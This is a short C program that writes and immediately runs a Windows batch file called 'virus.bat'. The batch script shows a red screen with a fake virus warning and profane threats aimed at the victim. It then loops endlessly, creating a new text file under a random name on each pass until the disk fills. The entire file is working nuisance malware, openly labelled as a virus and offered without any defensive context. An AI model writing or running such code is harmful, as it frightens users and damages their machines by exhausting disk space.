#include<stdio.h>
#define PATH "virus.bat"
#include<stdlib.h>
int main()
{
//	FILE *a= fopen("virus.bat","ab+");
	
	FILE *fp= fopen(PATH,"w");
	fprintf(fp,"COLOR 0c\necho off\nSET /a r=(\%%random\%%*10000)\necho warrning! !!! VIRUSE detected !!! \necho Dont close me!\necho if you close me your pc will be fucked up!\n:start\necho Fuck you bitch\%%r\%%\%%r\%%\%%r\%% ##\%%r\%% \%%r\%% \%%r\%% \%%r\%% \%%r\%% \%%r\%% \%%r\%% \%%r\%% \%%r\%% \%%r\%% \%%r\%% \%%r\%% \%%r\%% \%%r\%%  >FuckYou\%%random\%%.txt\ngoto start");
	fclose(fp);
	system("virus.bat"); 
	
//	system("Body.exe"); 
}
